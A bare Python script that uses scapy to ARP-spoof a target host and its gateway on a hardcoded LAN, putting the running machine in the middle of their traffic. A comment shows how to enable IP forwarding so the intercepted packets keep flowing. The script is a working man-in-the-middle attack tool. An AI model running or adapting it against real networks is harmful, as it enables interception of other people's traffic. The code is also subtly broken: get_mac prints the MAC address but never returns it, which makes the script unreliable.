#!/usr/bin/env python


# echo 1 > /proc/sys/net/ipv4/ip_forward to let the machine keep forwarding the packet even though we are in the middle between the target and the gateway  
import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst= ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff" )
    arp_request_broadcast = broadcast/arp_request
    answered_list , _ = scapy.srp(arp_request_broadcast, timeout=1)
    print(answered_list[0][1].hwsrc)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac ,psrc=spoof_ip)
    scapy.send(packet, verbose = False)



def restore(dest_ip,src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2,pdst=dest_ip,hwdst=dest_mac ,psrc=src_ip,hwsrc=src_mac)
    scapy.send(packet, count= 4,verbose= False)


try:
    send_packets_count = 0 
    while True :
        spoof("192.168.32.143", "192.168.32.1")
        spoof("192.168.32.1", "192.168.32.143")
        send_packets_count +=2
        print(f"\r[+] packets sent {str(send_packets_count)}", end= "")
        time.sleep(2)
except KeyboardInterrupt : 
    print("[+] Detected ctrl + C \n Quitting ...... ")
    restore("192.168.32.143", "192.168.32.1")
    restore("192.168.32.1", "192.168.32.143")